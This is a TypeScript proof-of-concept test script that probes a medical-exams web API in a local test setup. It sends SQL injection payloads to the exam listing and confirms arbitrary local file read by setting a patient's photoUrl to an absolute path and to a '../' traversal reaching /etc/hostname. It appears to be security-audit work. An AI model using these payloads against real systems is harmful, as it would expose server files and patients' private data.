// Standalone PoC runner (bypasses vitest transform; box is heavily contended).
// SQLi negative controls + photoUrl storage-ref path traversal on real (unmocked) storage.
process.env.NODE_ENV = 'test';
process.env.DATABASE_URL =
  process.env.TEST_DATABASE_URL ||
  'postgresql://meus_exames:meus_exames_dev@127.0.0.1:5433/meus_exames_test_sqli?schema=public';
process.env.JWT_SECRET = 'test-secret';
process.env.S3_BUCKET = ''; // disk mode — this is the deployment mode under test (.env has no S3_BUCKET)
process.env.UPLOAD_DIR = './data/test-exams';
process.env.PHOTOS_DIR = './data/test-photos';
process.env.SENTRY_DSN = '';

import fs from 'fs';
import os from 'os';
import path from 'path';
import request from 'supertest';

const log = (m: string) => console.log(`[${((Date.now() - t0) / 1000).toFixed(1)}s] ${m}`);
const t0 = Date.now();

async function main() {
  const { prisma } = await import('./src/prisma');
  const { signToken } = await import('./src/auth/jwt');
  const { app } = await import('./src/app');
  log('modules loaded');

  const suffix = `${Date.now().toString(36)}`;
  const user = await prisma.user.create({
    data: {
      email: `poc-${suffix}@exemplo.com`, name: 'POC User', passwordHash: 'x',
      credits: 10, emailVerified: true, role: 'OWNER',
    },
    select: { id: true },
  });
  const patient = await prisma.patient.create({
    data: {
      ownerId: user.id, fullName: 'POC Paciente', relationship: 'Titular',
      cpfHash: `poc-${suffix}`, cpfEncrypted: 'x', cpfIv: 'y', cpfLast4: '0000',
      identityLockedAt: new Date(),
    },
    select: { id: true },
  });
  const token = signToken({ userId: user.id });
  const auth = { Authorization: `Bearer ${token}` };

  // ---- 1) SQLi negative control: exam list sort/q (admin/payments needs ADMIN user; exam route is OWNER-reachable)
  const exams = await request(app)
    .get('/api/exams')
    .query({ _start: '0', _end: '25', _sort: 'title;SELECT 1--', _order: 'ASC', q: "' OR '1'='1" })
    .set(auth);
  log(`[SQLi-ctrl] GET /api/exams _sort payload → ${exams.status}, rows=${Array.isArray(exams.body) ? exams.body.length : 'n/a'}`);
  console.log(`  body-snippet: ${JSON.stringify(exams.body).slice(0, 200)}`);

  // ---- 2) photoUrl = ABSOLUTE path injection
  const marker = `POC-PHOTO-TRAVERSAL-${suffix}`;
  const secretFile = path.join(os.tmpdir(), 'poc-secret-marker.txt');
  fs.writeFileSync(secretFile, marker);
  const put = await request(app).put(`/api/patients/${patient.id}`).set(auth).send({ photoUrl: secretFile });
  log(`[traversal-abs] PUT photoUrl=${secretFile} → ${put.status}`);
  const get1 = await request(app).get(`/api/patients/${patient.id}/photo?t=${token}`);
  const absOk = get1.status === 200 && get1.text.includes(marker);
  log(`[traversal-abs] GET /photo → ${get1.status}, containsMarker=${get1.text.includes(marker)}, body=${JSON.stringify(get1.text.slice(0, 80))}`);

  // ---- 3) photoUrl = relative traversal to /etc/hostname
  const put2 = await request(app).put(`/api/patients/${patient.id}`).set(auth)
    .send({ photoUrl: '../../../../../../../../etc/hostname' });
  log(`[traversal-rel] PUT photoUrl=../../etc/hostname → ${put2.status}`);
  const get2 = await request(app).get(`/api/patients/${patient.id}/photo?t=${token}`);
  const body2 = Buffer.isBuffer(get2.body) ? get2.body.toString('utf8') : String(get2.body ?? '');
  const expected = fs.readFileSync('/etc/hostname', 'utf8').trim();
  const relOk = get2.status === 200 && body2.trim() === expected;
  log(`[traversal-rel] GET /photo → ${get2.status}, matches /etc/hostname=${relOk}, body=${JSON.stringify(body2.slice(0, 60))}`);

  console.log('\n=== RESULT ===');
  console.log(`SQLi control (exam list): ${exams.status === 200 ? 'NOT injectable (parameterized/allowlisted)' : 'CHECK: ' + exams.status}`);
  console.log(`photoUrl absolute-path traversal: ${absOk ? 'CONFIRMED — arbitrary local file read' : 'not confirmed'}`);
  console.log(`photoUrl relative traversal (/etc/hostname): ${relOk ? 'CONFIRMED — arbitrary local file read' : 'not confirmed'}`);

  await prisma.$disconnect();
  process.exit(absOk || relOk ? 7 : 0); // 7 = vuln confirmed (distinct from harness failure)
}

main().catch((e) => { console.error('HARNESS ERROR:', e?.stack || e); process.exit(1); });